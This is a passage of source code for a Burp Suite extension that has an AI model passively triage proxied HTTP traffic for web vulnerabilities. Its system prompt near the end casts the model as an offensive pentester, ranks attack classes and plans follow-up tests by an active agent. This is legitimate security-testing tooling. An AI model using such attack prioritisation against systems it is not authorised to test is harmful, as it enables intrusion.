                self.stderr.println("[!] JSON parse error: %s" % self._safe_ascii_text(e))
                self.stderr.println("[!] Attempting to repair malformed JSON...")
                
                # Try multiple repair strategies
                repaired = False
                
                try:
                    import re
                    original_text = ai_text
                    
                    # Strategy 1: Fix unterminated strings by adding closing quotes
                    lines = ai_text.split('\n')
                    fixed_lines = []
                    for line in lines:
                        # Skip empty lines
                        if not line.strip():
                            fixed_lines.append(line)
                            continue
                        
                        # Count unescaped quotes
                        quote_positions = []
                        i = 0
                        while i < len(line):
                            if line[i] == '"' and (i == 0 or line[i-1] != '\\'):
                                quote_positions.append(i)
                            i += 1
                        
                        # If odd number of quotes, try to fix
                        if len(quote_positions) % 2 == 1:
                            # Add closing quote before trailing comma/bracket/brace
                            line = line.rstrip()
                            if line.endswith(',') or line.endswith('}') or line.endswith(']'):
                                line = line[:-1] + '"' + line[-1]
                            elif not line.endswith('"'):
                                line = line + '"'
                        
                        fixed_lines.append(line)
                    
                    ai_text = '\n'.join(fixed_lines)
                    
                    # Strategy 2: Remove trailing commas
                    ai_text = re.sub(r',(\s*[}\]])', r'\1', ai_text)
                    ai_text = re.sub(r',\s*,+', ',', ai_text)
                    ai_text = re.sub(r'\[\s*,+', '[', ai_text)
                    ai_text = re.sub(r',+\s*\]', ']', ai_text)
                    ai_text = re.sub(r'}\s*{', '},{', ai_text)
                    
                    # Strategy 3: Ensure valid array structure
                    ai_text = ai_text.strip()
                    if not ai_text.startswith('['):
                        if ai_text.startswith('{'):
                            ai_text = '[' + ai_text
                        else:
                            # Find first {
                            start_obj = ai_text.find('{')
                            if start_obj != -1:
                                ai_text = '[' + ai_text[start_obj:]
                    
                    if not ai_text.endswith(']'):
                        if ai_text.endswith('}'):
                            ai_text = ai_text + ']'
                        else:
                            # Find last }
                            end_obj = ai_text.rfind('}')
                            if end_obj != -1:
                                ai_text = ai_text[:end_obj+1] + ']'
                    
                    # Strategy 4: Remove any garbage after final ]
                    final_bracket = ai_text.rfind(']')
                    if final_bracket != -1 and final_bracket < len(ai_text) - 1:
                        ai_text = ai_text[:final_bracket + 1]

                    ai_text = self._sanitize_ai_json_text(ai_text)
                    ai_text = self._truncate_oversized_json_string_values(ai_text, max_chars=1800)
                    
                    # Try parsing repaired JSON
                    findings = self._coerce_ai_findings(json.loads(ai_text))
                    repaired = True
                    repair_mode = "line_repair_success"
                    self.stdout.println("[+] JSON successfully repaired")
                    
                except Exception as repair_error:
                    self.stderr.println("[!] JSON repair failed: %s" % self._safe_ascii_text(repair_error))
                
                if not repaired:
                    # Last resort: try to extract any valid JSON objects
                    self.stderr.println("[!] Attempting last-resort JSON extraction...")
                    try:
                        findings = self._extract_findings_from_text(original_text, max_objects=10)

                        if findings:
                            self.stdout.println("[+] Extracted %d valid finding object(s) from malformed JSON" % len(findings))
                            repaired = True
                            repair_mode = "object_extraction"
                    except Exception as extraction_error:
                        self.stderr.println("[!] Last-resort extraction failed: %s" % self._safe_ascii_text(extraction_error))
                
                if not repaired:
                    parse_ms = self._perf_ms_since(parse_start)
                    phase_timings.append(("parse_failed", parse_ms))
                    self.stderr.println("[!] All repair attempts failed - skipping this analysis")
                    self.stderr.println("[!] AI response was too malformed to parse")
                    if self.VERBOSE:
                        self.stderr.println("[DEBUG] Failed response (first 1000 chars):")
                        self.stderr.println(self._safe_ascii_text(original_text[:1000]))
                    if task_id is not None:
                        self.updateTask(task_id, "Error (JSON Parse Failed)")
                    self.updateStats("errors")
                    if track_passive_cache:
                        self._record_passive_scan_failure(url_hash, url_str, "Error (JSON Parse Failed)", original_text[:500])
                    self._perf_debug(
                        "analysis abort parse_failed task=%s type=%s total=%dms parse_ms=%dms repair=%s ai_chars=%d phases=%s url=%s" % (
                            str(task_id), task_type_for_debug, self._perf_ms_since(analysis_start),
                            parse_ms, repair_mode, ai_chars, str(phase_timings), str(url_str)[:120]),
                        force=True)
                    return
            
            findings = self._coerce_ai_findings(findings)
            findings_count = len(findings)
            parse_ms = self._perf_ms_since(parse_start)
            phase_timings.append(("parse", parse_ms))
            self._perf_debug(
                "analysis parse done task=%s type=%s parse_ms=%dms findings=%d repair=%s ai_chars=%d url=%s" % (
                    str(task_id), task_type_for_debug, parse_ms, findings_count, repair_mode, ai_chars, str(url_str)[:120]),
                key="analysis-parse-done" if task_type_for_debug == "PROXY" else "analysis-parse-done-other",
                min_interval=1.0 if task_type_for_debug == "PROXY" else 2.0)

            # DEBUG: Log parsed findings
            if self.VERBOSE:
                finding_titles = [item.get("title", "Untitled") for item in findings if isinstance(item, dict)]
                self.stdout.println("[%s] [PARSED] %d finding(s): %s" % (source, len(findings), str(finding_titles)[:500]))

            created = 0
            skipped_dup = 0
            skipped_low_conf = 0

            phase_start = time.time()
            for item in findings:
                title = item.get("title", "AI Finding")
                severity = item.get("severity", "information").lower().strip()
                ai_conf = item.get("confidence", 50)
                
                # Skip findings with empty or generic titles
                if not title or title.strip() == "" or title == "AI Finding":
                    if self.VERBOSE:
                        self.stdout.println("[%s] URL: %s - [SKIP] Missing or generic title" % (source, url_str))
                    continue
                
                # Ensure ai_conf is an integer
                try:
                    ai_conf = int(ai_conf)
                except (ValueError, TypeError):
                    ai_conf = 50  # Default if conversion fails
                
                detail = item.get("detail", "")
                cwe = item.get("cwe", "")
                evidence_raw = item.get("evidence", [])
                
                param_name = ""
                if params_sample:
                    param_name = params_sample[0].get("name", "")

                raw_ai_conf = ai_conf
                agent_status = str(item.get("agent_status", item.get("triage_status", "")) or "").strip().lower()
                if agent_status not in ("valid", "needs_investigation", "not_important", "untouched"):
                    agent_status = "valid" if ai_conf >= 80 else "needs_investigation"
                agent_priority = str(item.get("agent_priority", item.get("active_priority", "")) or "").strip()
                if agent_priority not in ("P1", "P2", "P3", "P4", "defer"):
                    if severity in ("critical", "high") and ai_conf >= 80:
                        agent_priority = "P1" if severity == "critical" else "P2"
                    elif severity == "medium" or agent_status == "needs_investigation":
                        agent_priority = "P3"
                    else:
                        agent_priority = "P4"
                agent_rationale = str(item.get("agent_rationale", item.get("triage_rationale", "")) or "").strip()
                if not agent_rationale:
                    agent_rationale = "Passive scanner triage: %s at %d%% confidence based on captured evidence." % (agent_status, ai_conf)
                if len(agent_rationale) > 2000:
                    agent_rationale = agent_rationale[:2000] + "... [truncated]"

                if agent_status == "not_important":
                    skipped_low_conf += 1
                    continue

                active_test_recipe = self._normalize_active_test_recipe(
                    item.get("active_test_recipe", item),
                    {
                        "title": title,
                        "url": url,
                        "severity": severity,
                        "detail": detail,
                        "cwe": cwe,
                        "agent_status": agent_status,
                        "agent_priority": agent_priority,
                        "agent_rationale": agent_rationale
                    }
                )

                burp_conf = map_confidence(ai_conf)
                if not burp_conf:
                    skipped_low_conf += 1
                    if self.VERBOSE:
                        self.stdout.println("[%s] URL: %s - [SKIP] Low confidence" % (source, url_str))
                    self.updateStats("skipped_low_confidence")
                    continue

                finding_hash = self._get_finding_hash(url, title, cwe, param_name)
                with self.findings_lock:
                    if finding_hash in self.findings_cache:
                        skipped_dup += 1
                        if self.VERBOSE:
                            self.stdout.println("[%s] URL: %s - [SKIP] Duplicate finding" % (source, url_str))
                        self.updateStats("skipped_duplicate")
                        continue
                    self.findings_cache[finding_hash] = True

                severity = VALID_SEVERITIES.get(severity, "Information")
                burp_severity = "High" if severity == "Critical" else severity

                detail_parts = []
                detail_parts.append("<b>Description:</b><br>%s<br>" % detail)
                detail_parts.append("<br><b>AI Confidence:</b> %d%%<br>" % ai_conf)
                detail_parts.append("<br><b>Passive Triage:</b> %s / %s<br>%s<br>" % (
                    agent_status, agent_priority, agent_rationale))
                if active_test_recipe:
                    detail_parts.append("<br><b>Active Test Recipe:</b><br>")
                    detail_parts.append("Hypothesis: %s<br>" % self._safe_ascii_text(active_test_recipe.get("hypothesis", ""), 1000))
                    detail_parts.append("Test Type: %s<br>" % self._safe_ascii_text(active_test_recipe.get("active_test_type", ""), 200))
                    detail_parts.append("Mutation: %s<br>" % self._safe_ascii_text(active_test_recipe.get("mutation_hint", ""), 1200))
                    detail_parts.append("Expected Vulnerable Signal: %s<br>" % self._safe_ascii_text(active_test_recipe.get("expected_vulnerable_signal", ""), 1000))
                    detail_parts.append("Expected Safe Signal: %s<br>" % self._safe_ascii_text(active_test_recipe.get("expected_safe_signal", ""), 1000))
                    detail_parts.append("Request Budget: %s | Needs Second User: %s<br>" % (
                        str(active_test_recipe.get("max_requests", "")),
                        str(bool(active_test_recipe.get("needs_second_user", False)))))

                evidence_lines = []
                if isinstance(evidence_raw, basestring):
                    if evidence_raw.strip():
                        evidence_lines.append(evidence_raw.strip())
                elif isinstance(evidence_raw, dict):
                    ev_type = str(evidence_raw.get("type", "")).strip()
                    ev_location = str(evidence_raw.get("location", "")).strip()
                    ev_snippet = str(evidence_raw.get("snippet", evidence_raw.get("value", ""))).strip()
                    ev_reason = str(evidence_raw.get("reason", evidence_raw.get("why", ""))).strip()
                    combined = " | ".join([x for x in [ev_type, ev_location, ev_snippet, ev_reason] if x])
                    if combined:
                        evidence_lines.append(combined)
                elif isinstance(evidence_raw, list):
                    for ev in evidence_raw[:5]:
                        if isinstance(ev, basestring):
                            ev_text = ev.strip()
                            if ev_text:
                                evidence_lines.append(ev_text)
                        elif isinstance(ev, dict):
                            ev_type = str(ev.get("type", "")).strip()
                            ev_location = str(ev.get("location", "")).strip()
                            ev_snippet = str(ev.get("snippet", ev.get("value", ""))).strip()
                            ev_reason = str(ev.get("reason", ev.get("why", ""))).strip()
                            combined = " | ".join([x for x in [ev_type, ev_location, ev_snippet, ev_reason] if x])
                            if combined:
                                evidence_lines.append(combined)

                if evidence_lines:
                    detail_parts.append("<br><b>Evidence:</b><br>")
                    for ev_line in evidence_lines:
                        detail_parts.append("<code>%s</code><br>" % ev_line)
                
                if params_sample:
                    detail_parts.append("<br><b>Affected Parameter(s):</b><br>")
                    for param in params_sample[:3]:
                        param_name = param.get("name", "")
                        param_type = param.get("type", 0)
                        type_str = {0: "URL", 1: "Body", 2: "Cookie"}.get(param_type, "Unknown")
                        detail_parts.append("<code>%s (%s parameter)</code><br>" % (param_name, type_str))
                
                if item.get("cwe"):
                    cwe_id = item.get("cwe")
                    detail_parts.append("<br><b>CWE:</b><br>%s<br>" % cwe_id)
                    detail_parts.append("<a href='https://cwe.mitre.org/data/definitions/%s.html'>View CWE Details</a><br>" % 
                                       cwe_id.replace("CWE-", ""))
                
                if item.get("owasp"):
                    detail_parts.append("<br><b>OWASP:</b><br>%s<br>" % item.get("owasp"))
                
                if item.get("remediation"):
                    detail_parts.append("<br><b>Remediation:</b><br>%s<br>" % item.get("remediation"))
                
                detail_parts.append("<br><br><b>Note:</b><br>")
                detail_parts.append("<i>This finding was detected through passive AI analysis.</i><br>")
                
                full_detail = "".join(detail_parts)
                issue_title = title
                if not str(issue_title).startswith("(Double Agent)"):
                    issue_title = "(Double Agent) " + str(issue_title)

                issue = CustomScanIssue(messageInfo.getHttpService(), req.getUrl(),
                                       [messageInfo], issue_title, full_detail, burp_severity, burp_conf)
                self.callbacks.addScanIssue(issue)
                created += 1
                self.updateStats("findings_created")
                
                self.add_finding(url, title, severity, burp_conf,
                                detail=detail, cwe=str(cwe),
                                evidence=str(evidence_raw),
                                remediation=str(item.get("remediation", "")),
                                owasp=str(item.get("owasp", "")),
                                ai_confidence=ai_conf,
                                raw_ai_confidence=raw_ai_conf,
                                request_data=request_data_full,
                                response_data=response_data_full,
                                agent_status=agent_status,
                                agent_priority=agent_priority,
                                agent_rationale=agent_rationale,
                                active_test_recipe=active_test_recipe)
            finding_loop_ms = self._perf_ms_since(phase_start)
            phase_timings.append(("finding_loop", finding_loop_ms))

            if self.VERBOSE:
                self.stdout.println("[%s] Created:%d | Dup:%d | LowConf:%d" %
                                   (source, int(created), int(skipped_dup), int(skipped_low_conf)))
            if track_passive_cache:
                self._record_passive_scan_completed(
                    url_hash, url_str, method, res.getStatusCode(), findings_count,
                    created, skipped_dup, skipped_low_conf, ai_ms)
            total_ms = self._perf_ms_since(analysis_start)
            self._perf_debug(
                "analysis done task=%s type=%s source=%s total=%dms build_data=%dms prompt=%dms gate_wait=%dms ai=%dms parse=%dms finding_loop=%dms prompt_chars=%d est_tokens=%d ai_chars=%d findings=%d created=%d dup=%d low_conf=%d repair=%s phases=%s url=%s" % (
                    str(task_id), task_type_for_debug, source, total_ms, build_data_ms,
                    prompt_ms, ai_gate_wait_ms, ai_ms, parse_ms, finding_loop_ms, prompt_chars,
                    prompt_tokens, ai_chars, findings_count, int(created), int(skipped_dup),
                    int(skipped_low_conf), repair_mode, str(phase_timings), str(url_str)[:120]),
                key="analysis-done" if task_type_for_debug == "PROXY" else "analysis-done-other",
                min_interval=1.0 if task_type_for_debug == "PROXY" else 2.0,
                force=(total_ms > int(getattr(self, "PERF_DEBUG_SLOW_MS", 75)) * 5))

        except Exception as e:
            self.stderr.println("[!] %s error: %s" % (source, self._safe_ascii_text(e)))
            self.updateStats("errors")
            try:
                if source == "HTTP" and not bypass_dedup and getattr(self, "PROXY_DEDUPE_ENABLED", True):
                    self._record_passive_scan_failure(url_hash, url_str, "Error (Analysis Exception)", e)
            except:
                pass
            self._perf_debug(
                "analysis exception task=%s type=%s source=%s total=%dms build_data=%dms prompt=%dms gate_wait=%dms ai=%dms parse=%dms phases=%s error=%s url=%s" % (
                    str(task_id), task_type_for_debug, source, self._perf_ms_since(analysis_start),
                    build_data_ms, prompt_ms, ai_gate_wait_ms, ai_ms, parse_ms, str(phase_timings),
                    self._safe_ascii_text(e, 300), str(url_str or "")[:120]),
                force=True)

    def fingerprint_technology(self, headers, cookies, response_body):
        """
        Detect technology stack from headers, cookies, and response body.
        Returns a dict with detected frameworks, languages, and servers.
        """
        tech_info = {
            "frameworks": [],
            "language": None,
            "server": None,
            "authentication": [],
            "features": []
        }
        
        headers_lower = {k.lower(): str(v).lower() for k, v in headers.items()}
        
        # Server detection from headers
        server_header = headers_lower.get("server", "")
        powered_by = headers_lower.get("x-powered-by", "")
        
        # Web servers
        if "apache" in server_header:
            tech_info["server"] = "Apache"
        elif "nginx" in server_header:
            tech_info["server"] = "Nginx"
        elif "iis" in server_header or "microsoft-iis" in server_header:
            tech_info["server"] = "IIS"
        elif "cloudflare" in server_header:
            tech_info["server"] = "Cloudflare"
        
        # Framework/Language detection from X-Powered-By
        if "php" in powered_by or ".php" in response_body[:500].lower():
            tech_info["language"] = "PHP"
        if "asp.net" in powered_by or "asp.net" in server_header:
            tech_info["frameworks"].append("ASP.NET")
            tech_info["language"] = ".NET"
        if "django" in powered_by:
            tech_info["frameworks"].append("Django")
            tech_info["language"] = "Python"
        if "laravel" in powered_by or "laravel" in response_body[:1000].lower():
            tech_info["frameworks"].append("Laravel")
            tech_info["language"] = "PHP"
        if "express" in powered_by:
            tech_info["frameworks"].append("Express.js")
            tech_info["language"] = "Node.js"
        if "next.js" in powered_by or "__next" in response_body[:1000].lower():
            tech_info["frameworks"].append("Next.js")
        if "spring" in powered_by:
            tech_info["frameworks"].append("Spring")
            tech_info["language"] = "Java"
        
        # Cookie-based detection
        cookie_str = str(cookies).lower()
        if "session" in cookie_str or "phpsessid" in cookie_str:
            tech_info["features"].append("session-cookies")
        if "csrf" in cookie_str or "xsrf" in cookie_str:
            tech_info["features"].append("csrf-protection")
        if "jwt" in cookie_str or "token" in cookie_str:
            tech_info["features"].append("token-auth")
        if "asp.net_sessionid" in cookie_str:
            tech_info["frameworks"].append("ASP.NET")
        
        # Response body detection
        body_lower = response_body[:2000].lower()
        if "csrf-token" in body_lower or "_csrf" in body_lower:
            tech_info["features"].append("csrf-tokens")
        if "<form" in body_lower:
            tech_info["features"].append("forms-present")
        if "react" in body_lower or "__react" in body_lower:
            tech_info["frameworks"].append("React")
        if "vue" in body_lower or "__vue" in body_lower or "v-" in body_lower[:1000]:
            tech_info["frameworks"].append("Vue.js")
        if "angular" in body_lower or "ng-" in body_lower[:1000]:
            tech_info["frameworks"].append("Angular")
        
        # Authentication detection
        auth_header = headers_lower.get("www-authenticate", "")
        if "basic" in auth_header:
            tech_info["authentication"].append("Basic-Auth")
        if "bearer" in auth_header or "authorization" in headers_lower:
            tech_info["authentication"].append("Token-Auth")
        if "set-cookie" in str(headers).lower():
            tech_info["authentication"].append("Session-Cookies")
        
        return tech_info

    def get_neighboring_requests(self, target_url, target_timestamp, http_service):
        """
        Fetch neighboring requests from proxy history within time window.
        Returns list of simplified request/response summaries.
        """
        if not self.CONTEXT_ENRICHMENT_ENABLED or self.CONTEXT_NEIGHBOR_COUNT <= 0:
            return []
        
        try:
            # Get proxy history
            history = self.callbacks.getProxyHistory()
            if not history:
                return []
            
            neighbors = []
            target_host = str(http_service.getHost()) if http_service else ""
            max_age_seconds = self.CONTEXT_MAX_AGE_MINUTES * 60
            
            # Find our target request in history
            target_index = -1
            for i, entry in enumerate(history):
                try:
                    req = self.helpers.analyzeRequest(entry)
                    entry_url = str(req.getUrl())
                    if entry_url == target_url:
                        target_index = i
                        break
                except:
                    continue
            
            if target_index == -1:
                return []
            
            # Get requests before target
            before_count = 0
            for i in range(target_index - 1, -1, -1):
                if before_count >= self.CONTEXT_NEIGHBOR_COUNT:
                    break
                try:
                    entry = history[i]
                    req = self.helpers.analyzeRequest(entry)
                    res = self.helpers.analyzeResponse(entry.getResponse())
                    
                    # Same host check
                    entry_service = entry.getHttpService()
                    if entry_service and str(entry_service.getHost()) != target_host:
                        continue
                    
                    # Time check (if available)
                    if hasattr(entry, 'getTimestamp'):
                        entry_time = entry.getTimestamp()
                        if target_timestamp and abs(target_timestamp - entry_time) > max_age_seconds:
                            continue
                    
                    neighbors.insert(0, self._summarize_request(entry, req, res, "before"))
                    before_count += 1
                except:
                    continue
            
            # Get requests after target
            after_count = 0
            for i in range(target_index + 1, len(history)):
                if after_count >= self.CONTEXT_NEIGHBOR_COUNT:
                    break
                try:
                    entry = history[i]
                    req = self.helpers.analyzeRequest(entry)
                    res = self.helpers.analyzeResponse(entry.getResponse())
                    
                    entry_service = entry.getHttpService()
                    if entry_service and str(entry_service.getHost()) != target_host:
                        continue
                    
                    neighbors.append(self._summarize_request(entry, req, res, "after"))
                    after_count += 1
                except:
                    continue
            
            return neighbors
            
        except Exception as e:
            if self.VERBOSE:
                self.stdout.println("[CONTEXT] Error getting neighbors: %s" % self._safe_ascii_text(e))
            return []

    def _summarize_request(self, entry, req, res, position):
        """Create a compact summary of a request/response for context."""
        try:
            url = str(req.getUrl())
            method = req.getMethod()
            status = res.getStatusCode() if res else 0
            
            # Extract path from URL
            try:
                from java.net import URL
                path = URL(url).getPath()
            except:
                path = url
            
            # Get minimal parameter info
            params = req.getParameters()
            param_names = [p.getName() for p in params[:3]]  # First 3 param names only
            
            # Get content-type hint
            res_headers = res.getHeaders() if res else []
            content_type = ""
            for h in res_headers:
                h_lower = str(h).lower()
                if "content-type" in h_lower:
                    content_type = str(h).split(":", 1)[-1].strip()[:30]
                    break
            
            return {
                "position": position,
                "method": method,
                "path": path[:100],
                "status": status,
                "params": param_names,
                "content_type": content_type
            }
        except:
            return {"position": position, "error": "failed to summarize"}

    def build_enriched_data(self, messageInfo, url_str, task_id=None):
        """
        Build enriched data with context including neighboring requests, tech fingerprinting,
        auth signals, URL path structure, and relevant existing findings on the same host.
        Returns the data dict ready for build_prompt.
        """
        req = self.helpers.analyzeRequest(messageInfo)
        res = self.helpers.analyzeResponse(messageInfo.getResponse())
        url = str(req.getUrl())
        params = req.getParameters()

        request_bytes = messageInfo.getRequest()
        try:
            req_body = self.helpers.bytesToString(request_bytes[req.getBodyOffset():])[:2000]
        except:
            req_body = "[Binary/non-UTF8 content]"

        req_headers_list = [str(h) for h in req.getHeaders()[:15]]
        req_headers_dict = {}
        for h in req.getHeaders():
            try:
                parts = str(h).split(":", 1)
                if len(parts) == 2:
                    req_headers_dict[parts[0].strip()] = parts[1].strip()
            except:
                pass

        response_bytes = messageInfo.getResponse()
        try:
            res_body = self.helpers.bytesToString(response_bytes[res.getBodyOffset():])[:3000]
        except:
            res_body = "[Binary/non-UTF8 content]"

        res_headers_list = [str(h) for h in res.getHeaders()[:15]]
        res_headers_dict = {}
        for h in res.getHeaders():
            try:
                parts = str(h).split(":", 1)
                if len(parts) == 2:
                    res_headers_dict[parts[0].strip()] = parts[1].strip()
            except:
                pass

        params_sample = [{"name": p.getName(), "value": p.getValue()[:150],
                         "type": str(p.getType())} for p in params[:10]]

        # --- URL path structure ---
        try:
            from java.net import URL as JavaURL
            parsed = JavaURL(url)
            path_parts = [p for p in parsed.getPath().split("/") if p]
            url_depth = len(path_parts)
            path_keywords = path_parts[:8]
        except:
            url_depth = 0
            path_keywords = []

        # --- Auth signal extraction ---
        auth_signals = []
        auth_header = req_headers_dict.get("Authorization", req_headers_dict.get("authorization", ""))
        if auth_header:
            al = auth_header.lower()
            if al.startswith("bearer "):
                token = auth_header[7:].strip()
                parts = token.split(".")
                if len(parts) == 3:
                    auth_signals.append("JWT Bearer token (3-part, alg in header)")
                else:
                    auth_signals.append("Bearer token (opaque/non-JWT)")
            elif al.startswith("basic "):
                auth_signals.append("HTTP Basic Auth")
            elif al.startswith("digest "):
                auth_signals.append("HTTP Digest Auth")
            else:
                auth_signals.append("Authorization header present: %s" % auth_header[:40])
        cookie_header = req_headers_dict.get("Cookie", req_headers_dict.get("cookie", ""))
        if cookie_header:
            cookie_names = [c.split("=")[0].strip() for c in cookie_header.split(";") if "=" in c]
            auth_signals.append("Cookies: %s" % ", ".join(cookie_names[:8]))
        if not auth_header and not cookie_header:
            auth_signals.append("No authentication credentials in request")

        # --- Tech fingerprinting (uses existing method) ---
        tech_info = {}
        try:
            if self.CONTEXT_ENRICHMENT_ENABLED:
                tech_info = self.fingerprint_technology(res_headers_dict, cookie_header, res_body)
        except:
            pass

        # --- Neighboring requests (uses existing method) ---
        neighbors = []
        try:
            if self.CONTEXT_ENRICHMENT_ENABLED:
                http_service = messageInfo.getHttpService()
                neighbors = self.get_neighboring_requests(url, None, http_service)
        except:
            pass

        # --- Relevant existing findings on the same host ---
        existing_findings_summary = []
        try:
            from java.net import URL as JavaURL
            target_host = JavaURL(url).getHost()
            with self.findings_lock_ui:
                for f in self.findings_list:
                    if f.get("fp", False):
                        continue
                    try:
                        fhost = JavaURL(f.get("url", "http://x")).getHost()
                    except:
                        fhost = ""
                    if fhost == target_host:
                        existing_findings_summary.append({
                            "title": f.get("title", "")[:120],
                            "severity": f.get("severity", ""),
                            "url": f.get("url", "")[:120]
                        })
            existing_findings_summary = existing_findings_summary[-10:]  # most recent 10
        except:
            pass

        # --- Response size / content signals ---
        try:
            res_size = len(response_bytes) if response_bytes else 0
        except:
            res_size = 0
        content_type = res_headers_dict.get("Content-Type", res_headers_dict.get("content-type", ""))

        data = {
            "url": url,
            "method": req.getMethod(),
            "status": res.getStatusCode(),
            "mime_type": res.getStatedMimeType(),
            "content_type": content_type,
            "response_size_bytes": res_size,
            "url_depth": url_depth,
            "url_path_segments": path_keywords,
            "params_count": len(params),
            "params_sample": params_sample,
            "auth_signals": auth_signals,
            "request_headers": req_headers_list,
            "request_body": req_body,
            "response_headers": res_headers_list,
            "response_body": res_body,
            "tech_stack": tech_info,
            "neighboring_requests": neighbors,
            "existing_findings_on_host": existing_findings_summary
        }

        return data

    def _default_scan_prompt(self):
        return (
            "You are a senior offensive security engineer performing bug-bounty-grade web application "
            "penetration testing. Your reputation depends on zero false positives and high-impact findings. "
            "You think like an attacker: chain weaknesses, weaponize misconfigurations, and always "
            "articulate a concrete attack path with business impact.\n"
            "\n"
            "OUTPUT FORMAT:\n"
            "- Output ONLY a valid JSON array. No markdown, no prose outside JSON.\n"
            "- Do not wrap the JSON in ``` fences and do not include analysis text before or after the array.\n"
            "- All strings must be JSON-safe: escape internal quotes and backslashes.\n"
            "- Never include raw newlines inside JSON string values; use '\\n' escapes only.\n"
            "\n"
            "SIGNAL OVER NOISE:\n"
            "- Report findings with concrete evidence from the request/response data. Evidence-backed findings are valuable even if severity is low.\n"
            "- Every finding MUST be backed by an exact artifact (header, parameter, URL, body snippet) from the provided data.\n"
            "- Every finding SHOULD include: (a) what an attacker can concretely DO, (b) the preconditions, (c) the business impact. If impact is unclear, report it with lower confidence (50-70%) rather than dropping it.\n"
            "- Avoid hedging language ('may', 'could', 'potentially') - use firm statements with confidence scores to indicate certainty.\n"
            "- When in doubt, suppress generic scanner noise. Only return a lower-confidence item when there is a concrete active-test hypothesis worth sending to the active agent.\n"
            "\n"
            "PASSIVE TRIAGE GATE:\n"
            "- You are the cheap passive scanner and first triage layer. Put real thought into whether the issue is likely valid before returning it.\n"
            "- Do not return informational hardening, missing-header, banner, cookie-flag, or token-present observations unless the captured traffic shows a concrete exploit path.\n"
            "- Return only findings that are either likely valid from passive evidence or worth active verification by the expensive active agent.\n"
            "- For each returned finding set agent_status:\n"
            "  valid = passive evidence is strong enough that active testing should confirm impact, including real low-risk findings when agent_priority=P4.\n"
            "  needs_investigation = plausible and worth one focused active-agent check, but not proven from passive data.\n"
            "  not_important = false-positive, zero-risk, or non-actionable noise; normal findings/report views hide it. Do not use not_important for real low-risk issues; use valid + P4 instead.\n"
            "- For each returned finding set agent_priority: P1/P2 for high-impact likely-valid issues, P3 for focused active checks, P4 for valid low-risk issues, defer only for hidden non-reportable items.\n"
            "- agent_rationale must explain why this should or should not be sent to the active agent, tied to specific evidence.\n"
            "- For every returned valid or needs_investigation finding, include active_test_recipe. This is the handoff to the expensive active agent, so it must be specific enough to run without re-thinking the plan.\n"
            "\n"
            "ACTIVE TEST RECIPE:\n"
            "- hypothesis: the exact claim the active agent should validate.\n"
            "- why_now: why this is worth active testing based on passive evidence.\n"
            "- active_test_type: one of authorization, authentication, injection, ssrf, xss, csrf, business_logic, token_or_session, focused_validation.\n"
            "- baseline_request: what baseline request/response behavior to confirm first.\n"
            "- mutation_hint: the smallest safe request change to test the hypothesis.\n"
            "- expected_vulnerable_signal: what response/status/body difference would prove impact.\n"
            "- expected_safe_signal: what response/status/body difference would disprove or weaken it.\n"
            "- max_requests: 1-10 focused requests; keep cheap and bounded.\n"
            "- needs_second_user: true only when authorization/IDOR/account-bound proof needs another identity.\n"
            "- safety_notes: stop conditions and any user-confirmation requirement.\n"
            "\n"
            "ACCURACY AND GROUNDING:\n"
            "- NEVER fabricate or modify details. Use the EXACT HTTP method, URL, headers, parameters, "
            "status codes and body snippets as they appear in the provided data.\n"
            "- Do NOT invent endpoints, parameters, or behavior that is not explicitly observable.\n"
            "- Distinguish clearly between OBSERVED (present in data) and INFERRED (reasoned from patterns). "
            "Inferred claims belong in 'reason' fields, never in 'snippet'.\n"
            "\n"
            "EXPLOITABILITY-FIRST PRIORITIZATION (descending):\n"
            "1. Authentication bypass / broken auth (missing auth on sensitive endpoints, weak JWT, session fixation)\n"
            "2. Authorization flaws / IDOR / privilege escalation (predictable IDs, missing ownership checks)\n"
            "3. Server-side injection (SQLi, SSRF, SSTI, command injection, deserialization, XXE)\n"
            "4. Business logic abuse (race conditions, negative values, state manipulation, rate-limit bypass)\n"
            "5. Stored/reflected/DOM XSS with a concrete execution sink\n"
            "6. CSRF on state-changing endpoints without SameSite/token/origin protections\n"
            "7. Sensitive data exposure (PII, credentials, internal tokens in responses)\n"
            "8. Misconfiguration with impact (CORS with credentials+wildcard, open redirects used in auth, cache poisoning)\n"
            "9. Security-header gaps ONLY when they enable a concrete attack in this context\n"
            "\n"
            "FALSE POSITIVE SUPPRESSION (do NOT flag):\n"
            "- Bearer/JWT/cookie tokens appearing in Authorization headers, Set-Cookie, or request bodies. "
            "Proxy traffic is visible by design; this is not exposure.\n"
            "- Missing security headers (CSP, HSTS, X-Frame-Options, Referrer-Policy, Permissions-Policy) "
            "as standalone findings unless you can show a concrete exploit path in THIS endpoint.\n"
            "- 'Information disclosure' for server banners, framework names, or version strings unless "
            "they map to a known exploitable CVE relevant to the observed endpoint.\n"
            "- Verbose error messages that do not reveal secrets, paths to internal systems, or injection oracles.\n"
            "- CORS findings when Access-Control-Allow-Origin is a fixed trusted origin or no credentials are allowed.\n"
            "- Clickjacking on endpoints that perform no sensitive state change.\n"
            "- Cookie flag issues (HttpOnly/Secure/SameSite) on non-session cookies (telemetry, locale, A/B test).\n"
            "- 'Weak TLS' or 'HTTP used' based on a single request; the proxy may be downgrading locally.\n"
            "- Generic 'rate limiting missing' without an attack scenario (enumeration/brute-force target).\n"
            "\n"
            "JAVASCRIPT FILE ANALYSIS:\n"
            "When analyzing .js files, look beyond standard web vulnerabilities. JS files are a goldmine for recon and attack surface:\n"
            "- Hardcoded secrets: API keys, tokens, passwords, database connection strings, AWS/Azure/GCP credentials\n"
            "- Prototype pollution sinks: jQuery extend, lodash merge/defaultsDeep, object spread abuse, unsafe property assignments\n"
            "- DOM-based XSS: document.write, innerHTML, outerHTML, insertAdjacentHTML, eval, setTimeout/setInterval with strings, location.href manipulation\n"
            "- Insecure configurations: CORS allowedOrigins, CSP report-uri endpoints, debug flags, feature flags enabling dangerous features\n"
            "- Exposed endpoints: API base URLs, internal service addresses, GraphQL endpoints, WebSocket URLs\n"
            "- Source maps: .map file references that reveal original source code and developer paths\n"
            "- Debug logging: console.log with sensitive data, verbose error handling exposing internals\n"
            "- Framework leaks: React devtools flag, Vue.js configs, Angular debug info\n"
            "- Authentication logic: JWT handling, session management, OAuth flows with hardcoded secrets\n"
            "- Safe to flag: Any concrete secret or sink with evidence from the JS content.\n"
            "\n"
            "XML FILE ANALYSIS:\n"
            "When analyzing .xml files, look for security-relevant content:\n"
            "- XXE indicators: DOCTYPE declarations, external entity references (file://, http://), parameter entities\n"
            "- SAML tokens: Assertion IDs, signature validation weaknesses, wrapping attacks\n"
            "- SOAP endpoints: WSDL references, method exposure, authentication in headers\n"
